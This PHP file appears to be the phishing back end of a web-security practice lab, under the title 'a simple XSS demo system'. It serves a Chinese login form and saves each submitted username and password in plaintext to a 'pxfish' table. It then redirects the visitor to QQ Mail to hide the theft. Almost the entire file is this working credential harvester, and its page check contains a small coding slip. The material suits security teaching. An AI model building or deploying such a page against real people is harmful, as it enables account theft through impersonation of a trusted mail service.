<?php
$PIKA_ROOT_DIR =  "";

include_once $PIKA_ROOT_DIR.'mysql/mysql.php';
include_once $PIKA_ROOT_DIR.'mysql/connect.php';


$SELF_PAGE = substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1);
if ($SELF_PAGE = "index.php"){
    $ACTIVE = array('','','','','','','','active open','','','','','','active','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','');

}



$link=connect();
$html='';
if(array_key_exists("username",$_POST) && $_POST['username']!=null){
    $username=escape($link, $_POST['username']);
    $password=escape($link, $_POST['password']);
    $time=$time=date('Y-m-d g:i:s');
    $query="insert into pxfish(time,username,password) values('$time','$username','$password')";
    $result=execute($link, $query);
    if(mysqli_affected_rows($link)==1){
      //$html.="<p>恭喜您，登录成功!</p>";
      $html.=header("location: https://mail.qq.com/");//可以自己选择是显示登录成功或者跳转
  }else {
      $html.="<p>登录失败，请重新登录！</p>";
  }

}

?>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>一个简单的xss演示系统</title>
</head>

<div class="main-content" xmlns="http://www.w3.org/1999/html">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
            </ul><!-- /.breadcrumb -->

        </div>
        <div class="page-content">
            <div id="xss_blind">
                <p class="blindxss_tip">请您输入您的用户名和密码进行登录</p>
                <p class="blindxss_tip">请输入您的用户名</p>
                <form method="post" >
                    <input class="username" name="username"/><br />
                    <label>您的密码</label><br />
                    <input class="password" type="text" name="password"/><br />
                    <input type="submit" name="submit" value="登录" />
                </form>
                <?php echo $html;?>
            </div>
        </div><!-- /.page-content -->
    </div>
</div><!-- /.main-content -->